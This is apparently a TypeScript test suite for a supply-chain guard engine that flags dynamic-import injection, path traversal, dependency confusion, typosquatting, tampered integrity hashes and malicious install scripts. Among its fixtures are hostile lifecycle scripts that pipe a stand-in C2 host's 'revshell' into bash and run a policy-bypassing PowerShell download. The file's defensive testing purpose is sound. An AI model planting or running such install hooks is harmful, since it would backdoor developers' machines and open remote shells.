import { describe, it, expect, beforeEach } from 'bun:test';
import {
  SupplyChainGuardEngine,
  DEFAULT_DEPENDENCY_POLICY,
  SAMPLE_SUPPLY_CHAIN_ATTACKS,
  SAMPLE_BENIGN_DEPENDENCIES,
  computeLevenshteinDistance,
  canonicalStringify
} from '../src/supplyChainGuard';
import {
  DependencyRiskSeverity,
  DependencyThreatCategory,
  DependencyValidationAction
} from '@terapiainfoco/shared';

describe('Supply Chain Guard & Dynamic Dependency Injection Shield (SLSA L3, CWE-470, CWE-912)', () => {
  let engine: SupplyChainGuardEngine;

  beforeEach(() => {
    engine = new SupplyChainGuardEngine();
  });

  describe('1. Validação de Importações Dinâmicas (CWE-470)', () => {
    it('deve aprovar com ALLOW especificadores estáticos seguros de módulos locais', () => {
      const result = engine.validateDynamicImportPath('./components/ClinicalChart.js');
      expect(result.isAllowed).toBe(true);
      expect(result.action).toBe(DependencyValidationAction.ALLOW);
      expect(result.threats.length).toBe(0);
      expect(result.sanitizedSpecifier).toBe('./components/ClinicalChart.js');
    });

    it('deve bloquear com BLOCK especificadores que usam interpolação dinâmica de variáveis', () => {
      const result = engine.validateDynamicImportPath('./plugins/' + 'userPlugin' + '.js');
      // Concatenação dinâmica explícita
      const attackResult = engine.validateDynamicImportPath('`./modules/${userSuppliedPlugin}`');
      expect(attackResult.isAllowed).toBe(false);
      expect(attackResult.action).toBe(DependencyValidationAction.BLOCK);
      expect(
        attackResult.threats.some((t) => t.category === DependencyThreatCategory.DYNAMIC_IMPORT_INJECTION)
      ).toBe(true);
    });

    it('deve bloquear com BLOCK importações dinâmicas de URLs externas remotas', () => {
      const result = engine.validateDynamicImportPath('https://malicious-cdn.attacker.org/payload.js');
      expect(result.isAllowed).toBe(false);
      expect(result.action).toBe(DependencyValidationAction.BLOCK);
      expect(
        result.threats.some((t) => t.category === DependencyThreatCategory.UNTRUSTED_REGISTRY)
      ).toBe(true);
    });

    it('deve colocar em quarentena ou bloquear tentativas de Path Traversal de escape', () => {
      const result = engine.validateDynamicImportPath('../../etc/shadow');
      expect(result.isAllowed).toBe(false);
      expect(
        result.threats.some((t) => t.category === DependencyThreatCategory.UNSAFE_SPECIFIER_MANIPULATION)
      ).toBe(true);
    });

    it('deve rejeitar especificadores contendo null bytes ou caracteres de controle', () => {
      const result = engine.validateDynamicImportPath('./safeModule.js\x00malicious.js');
      expect(result.isAllowed).toBe(false);
      expect(result.action).toBe(DependencyValidationAction.BLOCK);
    });
  });

  describe('2. Detecção de Dependency Confusion (Mitre ATT&CK T1195.001)', () => {
    it('deve bloquear pacote sem escopo oficial que tente imitar namespace interno', () => {
      const attackManifest = {
        name: 'terapiainfoco-clinical-crypto',
        version: '10.0.0'
      };

      const result = engine.inspectDependencies(attackManifest);
      expect(result.isValid).toBe(false);
      expect(result.action).toBe(DependencyValidationAction.BLOCK);
      expect(result.blockedCount).toBeGreaterThanOrEqual(1);

      const confusionThreat = result.threats.find(
        (t) => t.category === DependencyThreatCategory.DEPENDENCY_CONFUSION
      );
      expect(confusionThreat).toBeDefined();
      expect(confusionThreat?.cwe).toBe('CWE-470');
    });

    it('deve permitir pacote interno quando o escopo oficial @terapiainfoco estiver presente', () => {
      const validInternalManifest = {
        name: '@terapiainfoco/shared',
        version: '1.0.0',
        integrity: 'sha512-validHash123456789012345678901234567890'
      };

      const result = engine.inspectDependencies([validInternalManifest as any]);
      expect(result.isValid).toBe(true);
      expect(result.action).toBe(DependencyValidationAction.ALLOW);
    });
  });

  describe('3. Detecção de Typosquatting via Levenshtein', () => {
    it('deve calcular corretamente a distância de Levenshtein entre strings', () => {
      expect(computeLevenshteinDistance('react', 'reacct')).toBe(1);
      expect(computeLevenshteinDistance('lodash', 'loadsh')).toBe(2);
      expect(computeLevenshteinDistance('same', 'same')).toBe(0);
    });

    it('deve sinalizar alerta ou quarentena para dependência typosquatted', () => {
      const typosquatManifest = {
        dependencies: {
          'reacct': '^18.2.0',
          'loadsh': '^4.17.21'
        }
      };

      const result = engine.inspectDependencies(typosquatManifest);
      expect(result.threats.some((t) => t.category === DependencyThreatCategory.TYPOSQUATTING)).toBe(true);
    });
  });

  describe('4. Detecção de Scripts de Ciclo de Vida Maliciosos (CWE-912 Backdoors)', () => {
    it('deve bloquear manifestos com postinstall usando curl para download remoto', () => {
      const backdoorManifest = {
        name: 'compromised-telemetry-hook',
        version: '2.0.0',
        integrity: 'sha512-validHashMock1234567890',
        scripts: {
          postinstall: 'curl -s https://evil-c2.com/revshell | bash'
        }
      };

      const result = engine.inspectDependencies(backdoorManifest);
      expect(result.isValid).toBe(false);
      expect(result.action).toBe(DependencyValidationAction.BLOCK);

      const backdoorThreat = result.threats.find(
        (t) => t.category === DependencyThreatCategory.MALICIOUS_LIFECYCLE_SCRIPT
      );
      expect(backdoorThreat).toBeDefined();
      expect(backdoorThreat?.cwe).toBe('CWE-912');
    });

    it('deve bloquear manifestos com preinstall invocando powershell malicioso', () => {
      const powershellManifest = {
        name: 'win-backdoor-helper',
        version: '1.0.0',
        integrity: 'sha512-validHashMock1234567890',
        scripts: {
          preinstall: 'powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://c2.org"'
        }
      };

      const result = engine.inspectDependencies(powershellManifest);
      expect(result.isValid).toBe(false);
      expect(
        result.threats.some((t) => t.category === DependencyThreatCategory.MALICIOUS_LIFECYCLE_SCRIPT)
      ).toBe(true);
    });
  });

  describe('5. Verificação de Integridade Subresource Integrity (SRI)', () => {
    it('deve aprovar dependências com SRI sha512 canônico válido', () => {
      const validDeps = [...SAMPLE_BENIGN_DEPENDENCIES];
      const result = engine.inspectDependencies(validDeps);
      expect(result.isValid).toBe(true);
      expect(result.compliantSlsaLevel).toBe('SLSA_LEVEL_3');
    });

    it('deve rejeitar integridade corrompida ou manipulada', () => {
      const tamperedDep = {
        name: 'tampered-package',
        version: '1.0.0',
        integrity: 'sha512-corrupted-and-tampered-data-signature'
      };

      const result = engine.inspectDependencies([tamperedDep as any]);
      expect(result.isValid).toBe(false);
      expect(
        result.threats.some((t) => t.category === DependencyThreatCategory.SRI_CHECKSUM_MISMATCH)
      ).toBe(true);
    });
  });

  describe('6. Emissão e Validação Notarial de Selos WORM RFC 8785 (JCS)', () => {
    it('deve emitir selo notarial RFC 8785 determinístico assinado com HMAC-SHA256', () => {
      const result = engine.inspectDependencies(SAMPLE_BENIGN_DEPENDENCIES);
      expect(result.seal).toBeDefined();
      expect(result.seal?.sealToken.startsWith('dep_chain_seal_')).toBe(true);
      expect(result.seal?.algorithm).toBe('HMAC-SHA256-RFC8785-JCS');
      expect(result.seal?.auditAction).toBe('SUPPLY_CHAIN_SEAL_VERIFIED');
    });

    it('deve validar positivamente o selo emitido contra a inspeção correspondente', () => {
      const result = engine.inspectDependencies(SAMPLE_BENIGN_DEPENDENCIES);
      const verification = engine.verifySeal(result.seal!, result);
      expect(verification.isValid).toBe(true);
      expect(verification.message).toContain('integridade forense');
    });

    it('deve rejeitar selo adulterado ou dados modificados', () => {
      const result = engine.inspectDependencies(SAMPLE_BENIGN_DEPENDENCIES);
      const modifiedResult = {
        ...result,
        totalDependenciesScanned: 9999
      };

      const verification = engine.verifySeal(result.seal!, modifiedResult);
      expect(verification.isValid).toBe(false);
      expect(verification.message).toContain('não coincide');
    });

    it('deve rejeitar tokens de selo malformados', () => {
      const verification = engine.verifySeal('token_invalido_sem_prefixo');
      expect(verification.isValid).toBe(false);
    });
  });

  describe('7. Governança de Políticas de Supply Chain', () => {
    it('deve permitir atualizar políticas em runtime e aplicar quarentena customizada', () => {
      engine.updatePolicy({
        quarantinedPackages: ['bad-actor-lib']
      });

      const result = engine.inspectDependencies([
        {
          name: 'bad-actor-lib',
          version: '1.0.0',
          integrity: 'sha512-validHash123'
        } as any
      ]);

      expect(result.isValid).toBe(false);
      expect(
        result.threats.some((t) => t.category === DependencyThreatCategory.KNOWN_VULNERABILITY)
      ).toBe(true);
    });
  });
});
